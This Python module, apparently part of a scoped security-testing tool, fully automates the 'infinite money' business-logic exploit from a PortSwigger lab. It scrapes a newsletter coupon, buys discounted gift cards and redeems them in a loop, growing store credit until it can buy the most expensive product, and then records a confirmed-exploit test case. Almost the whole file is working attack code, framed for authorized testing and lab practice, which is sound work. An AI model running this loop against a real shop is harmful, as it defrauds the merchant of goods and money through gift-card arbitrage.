"""
Infinite-money flow ("infinite money logic flaw").

A reusable discount coupon (revealed by newsletter sign-up) makes a gift card cost
less than its redeemable face value. Each buy→redeem cycle nets the difference as
store credit, so credit can be grown without bound until an otherwise-unaffordable
item (the jacket) is within reach.

Chain: log in → sign up for the newsletter (scrape the coupon) → identify the gift
card product and the expensive target → probe one cycle to measure the discounted
price and face value *from store-credit deltas* (robust to cart markup) → buy gift
cards in bulk within current credit and redeem every code, growing credit until the
target is affordable → buy the target → check the solved state. Request-heavy, so
it runs only as a purchase fallback.
"""

from __future__ import annotations

import logging
import re

from ..core.scope import Scope, ScopeError
from ..engine.auth import AuthManager
from ..engine.http_client import RateLimiter, ScopedClient
from ..testing.schema import Severity, TestCase, TestStep, VulnClass, Verdict

logger = logging.getLogger("venom.flows.infinite_money")

_CSRF = re.compile(r'name=["\']?csrf["\']?[^>]*?value=["\']?([^"\'\s>]+)')
_CREDIT = re.compile(r'store credit:\s*\$([\d,]+)\.(\d{2})', re.I)
_COUPON = re.compile(r'coupon\s+([A-Z0-9]{4,})', re.I)

MAX_CYCLES = 80
MAX_QTY = 99            # cap per add-to-cart line
SAFETY_REQUESTS = 2500


def _csrf(t):
    m = _CSRF.search(t or ""); return m.group(1) if m else None


def _credit_cents(t):
    m = _CREDIT.search(t or "")
    return int(m.group(1).replace(",", "")) * 100 + int(m.group(2)) if m else None


def _codes(checkout_html: str) -> list[str]:
    """Gift-card codes from the confirmation table (region after 'gift cards')."""
    i = (checkout_html or "").lower().find("gift cards")
    region = checkout_html[i:] if i >= 0 else (checkout_html or "")
    return re.findall(r'<td>([A-Za-z0-9]{8,})</td>', region)


def _find_cart(registry) -> str | None:
    for e in registry:
        if (e.method.upper() == "POST" and "cart" in e.path.lower()
                and any(p.name.lower() in ("quantity", "qty") for p in e.parameters)):
            return e.path
    return "/cart" if registry.catalog else None


async def run(scope: Scope, registry, *, transport=None) -> list[TestCase]:
    cart_path = _find_cart(registry)
    if not cart_path or len(registry.catalog) < 2 or not scope.identities:
        return []
    catalog = {pid: int(p) for pid, p in registry.catalog.items() if int(p) > 0}
    if len(catalog) < 2:
        return []
    target_id = max(catalog, key=catalog.get)        # the expensive target (jacket)
    base = scope.authorized_base_urls[0]
    checkout = "/cart/checkout"
    limiter = RateLimiter(scope.rate_limit_per_second)

    try:
        c = ScopedClient(scope, base, role="money", limiter=limiter, transport=transport)
    except ValueError:
        return []
    try:
        c.apply_auth(await AuthManager(scope, transport=transport).ensure(scope.identities[0]["name"]))
    except Exception as exc:  # noqa: BLE001
        logger.warning("infinite-money auth failed: %s", exc)
        await c.aclose()
        return []

    reqs = 0

    async def get(p):
        nonlocal reqs; reqs += 1
        return await c.request("GET", p, follow_redirects=True)

    async def post(p, data, destructive=False):
        nonlocal reqs; reqs += 1
        return await c.request("POST", p, data=data, follow_redirects=True, destructive=destructive)

    async def credit_now():
        a = await get("/my-account")
        return _credit_cents(a.text if a else ""), _csrf(a.text if a else "")

    async def buy(gc_id, qty, coupon):
        """Add qty gift cards, apply coupon, checkout; return the codes."""
        await post(cart_path, {"productId": gc_id, "redir": "PRODUCT", "quantity": str(qty)})
        cart = await get("/cart")
        await post("/cart/coupon", {"csrf": _csrf(cart.text if cart else ""), "coupon": coupon})
        cart2 = await get("/cart")
        cot = await post(checkout, {"csrf": _csrf(cart2.text if cart2 else "")})
        return _codes(cot.text if cot else "")

    async def redeem(codes, csrf_tok):
        for code in codes:
            await post("/gift-card", {"csrf": csrf_tok, "gift-card": code})

    steps: list[TestStep] = []
    try:
        home = await get("/")
        await post("/sign-up", {"csrf": _csrf(home.text if home else ""), "email": "venom@money.lab"})
        su = await get("/")
        m = _COUPON.search((home.text or "") + (su.text if su else ""))
        coupon = m.group(1).upper() if m else ""
        if not coupon:
            logger.info("infinite-money: no coupon found — skipping")
            return []

        gc_id = None
        for pid in catalog:
            pp = await get(f"/product?productId={pid}")
            if pp and "gift card" in (pp.text or "").lower():
                gc_id = pid
                break
        if gc_id is None:
            logger.info("infinite-money: no gift-card product found — skipping")
            return []

        target_price = catalog[target_id]
        credit, _ = await credit_now()
        if credit is None:
            logger.info("infinite-money: cannot read store credit — skipping")
            return []
        steps.append(TestStep(step=1, description=f"sign up (coupon {coupon}); gift card={gc_id}; "
                              f"start credit={credit}c; target {target_id}@{target_price}c",
                              method="POST", path="/sign-up"))

        # Probe one card: measure discounted price and face value from credit deltas.
        before = credit
        codes = await buy(gc_id, 1, coupon)
        after_buy, csrf_mc = await credit_now()
        unit = before - (after_buy if after_buy is not None else before)
        await redeem(codes, csrf_mc)
        after_redeem, _ = await credit_now()
        face = (after_redeem - after_buy) if (after_redeem is not None and after_buy is not None) else 0
        credit = after_redeem if after_redeem is not None else credit
        if unit <= 0 or face <= unit:
            logger.info("infinite-money: no profit (unit=%dc face=%dc) — skipping", unit, face)
            return []
        logger.info("infinite-money: unit=%dc face=%dc profit=%dc/card; credit %dc target %dc",
                    unit, face, face - unit, credit, target_price)

        # Grow credit until the target is affordable.
        cycles = 0
        while credit < target_price and cycles < MAX_CYCLES and reqs < SAFETY_REQUESTS:
            cycles += 1
            qty = min(MAX_QTY, credit // unit)       # qty*unit <= credit (never overspend)
            if qty < 1:
                break
            codes = await buy(gc_id, qty, coupon)
            _, csrf_mc = await credit_now()
            await redeem(codes, csrf_mc)
            credit, _ = await credit_now()
            if credit is None:
                break
            logger.info("infinite-money: cycle %d bought %d card(s); credit now %dc", cycles, qty, credit)

        steps.append(TestStep(step=2, description=f"grew store credit to {credit}c over {cycles} cycle(s)",
                              method="POST", path="/gift-card"))
        if credit is None or credit < target_price:
            logger.info("infinite-money: credit %s below target %dc after %d cycles",
                        credit, target_price, cycles)
            return []

        # Buy the target now that it's affordable.
        await post(cart_path, {"productId": target_id, "redir": "PRODUCT", "quantity": "1"})
        cart = await get("/cart")
        await post(checkout, {"csrf": _csrf(cart.text if cart else "")})
        steps.append(TestStep(step=3, description=f"buy target {target_id} with grown credit",
                              method="POST", path=checkout))
        home = await get("/")
        solved = bool(home and "is-solved" in (home.text or ""))

        note = "LAB SOLVED (is-solved)" if solved else f"target purchased; credit {credit}c"
        verdict = Verdict.CONFIRMED_EXPLOIT if solved else Verdict.NEEDS_REVIEW
        return [TestCase(
            test_id="MNY-001",
            vulnerability_class=VulnClass.ECONOMIC_ABUSE,
            hypothesis=(f"Infinite money: coupon {coupon} buys a gift card (face {face}c) for "
                        f"{unit}c; redeeming returns the full face value, netting {face - unit}c per "
                        "card. Looping grows store credit until the target is affordable."),
            risk_rating=Severity.HIGH,
            affected_endpoint=f"POST {cart_path} + POST /gift-card",
            business_impact="Unlimited store credit / free goods via gift-card arbitrage (financial loss).",
            steps=steps,
            origin="flow",
            verdict=verdict,
            notes=[note],
            rag_source="PortSwigger: Infinite money logic flaw / WSTG-BUSL-02",
        )]
    except ScopeError as exc:
        logger.warning("infinite-money blocked by scope: %s", exc)
        return []
    finally:
        await c.aclose()
